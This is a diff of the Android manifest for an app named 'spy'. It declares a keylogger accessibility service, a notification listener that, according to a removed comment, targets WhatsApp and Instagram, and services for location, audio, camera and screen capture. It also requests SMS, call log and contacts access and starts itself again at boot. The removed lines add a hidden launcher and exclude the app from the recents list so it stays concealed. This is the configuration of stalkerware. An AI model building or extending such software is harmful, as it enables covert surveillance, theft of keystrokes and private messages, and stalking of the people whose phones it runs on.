@@ -3,64 +3,45 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.gauravhanna.spy">
 
-    <!-- ========== PERMISSIONS ========== -->
-
-    <!-- Network Permissions -->
+    <!-- Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- Location Permissions -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-
-    <!-- Media Permissions -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
-
-    <!-- Contacts & Messages Permissions -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-
-    <!-- Storage Permissions -->
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-
-    <!-- Special Permissions -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"
-        tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-        tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
-
-    <!-- Foreground Service Permissions -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-
-    <!-- System Permissions -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- ========== HARDWARE FEATURES ========== -->
-
+    <!-- Hardware features (optional) -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
     <uses-feature android:name="android.hardware.telephony" android:required="false" />
     <uses-feature android:name="android.hardware.location" android:required="false" />
     <uses-feature android:name="android.hardware.location.gps" android:required="false" />
-
-    <!-- ========== APPLICATION ========== -->
 
     <application
         android:allowBackup="true"
@@ -70,76 +51,43 @@
         android:usesCleartextTraffic="true"
         android:requestLegacyExternalStorage="true"
         android:supportsRtl="true"
-        android:allowTaskReparenting="true"
         tools:targetApi="31"
         tools:ignore="ProtectedPermissions,UnsupportedChromeOsHardware,ScopedStorage"
         tools:replace="android:label">
 
-        <!-- ========== HIDDEN LAUNCHER ACTIVITY (First Launch) ========== -->
+        <!-- Main Launcher Activity -->
         <activity
-            android:name=".HiddenLauncherActivity"
+            android:name=".MainActivity"
             android:exported="true"
+            android:launchMode="singleInstance"
             android:theme="@style/Theme.AppCompat.NoActionBar"
-            android:excludeFromRecents="true"
-            android:noHistory="true"
-            android:launchMode="singleTask">
+            android:screenOrientation="portrait">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- ========== MAIN ACTIVITY (Hidden After First Launch) ========== -->
-        <activity
-            android:name=".MainActivity"
-            android:exported="false"
-            android:theme="@style/Theme.AppCompat.NoActionBar"
-            android:excludeFromRecents="true"
-            android:noHistory="true"
-            android:launchMode="singleInstance"
-            android:screenOrientation="portrait" />
-
-        <!-- ========== SERVICES ========== -->
-
         <!-- Main Background Service -->
         <service
             android:name=".BackgroundService"
             android:exported="false"
             android:foregroundServiceType="dataSync"
-            android:enabled="true"
-            android:stopWithTask="false" />
+            android:enabled="true" />
 
-        <!-- Location Service -->
-        <service
-            android:name=".LocationService"
-            android:exported="false"
-            android:foregroundServiceType="location"
-            android:enabled="true"
-            android:stopWithTask="false" />
-
-        <!-- Media Projection Service for Screenshots -->
+        <!-- Media Projection Service (only once) -->
         <service
             android:name=".MediaProjectionService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection"
-            android:enabled="true"
-            android:stopWithTask="false" />
-
-        <!-- Screenshot Capture Service -->
-        <service
-            android:name=".ScreenshotCaptureService"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection"
-            android:enabled="true"
-            android:stopWithTask="false" />
+            android:enabled="true" />
 
         <!-- Accessibility Service for Keylogger -->
         <service
             android:name=".KeyloggerService"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:enabled="true"
-            android:stopWithTask="false">
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -148,35 +96,37 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- Notification Listener Service for WhatsApp, Instagram, etc. -->
+        <!-- Location Service -->
+        <service
+            android:name=".LocationService"
+            android:exported="false"
+            android:foregroundServiceType="location"
+            android:enabled="true" />
+
+        <!-- Notification Listener Service -->
         <service
             android:name=".NotificationListener"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true"
-            android:enabled="true"
-            android:stopWithTask="false">
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
 
-        <!-- ========== RECEIVERS ========== -->
-
-        <!-- Boot Receiver - Auto Start on Device Boot -->
+        <!-- Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true"
-            android:enabled="true"
-            android:directBootAware="true">
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
-        <!-- Network Change Receiver - Sync Data on Network Available -->
+        <!-- Network Change Receiver -->
         <receiver
             android:name=".NetworkChangeReceiver"
             android:exported="true"
@@ -192,9 +142,7 @@
             android:exported="false"
             android:enabled="true" />
 
-        <!-- ========== PROVIDERS ========== -->
-
-        <!-- File Provider for Sharing Screenshots/Photos -->
+        <!-- Provider for File Sharing -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
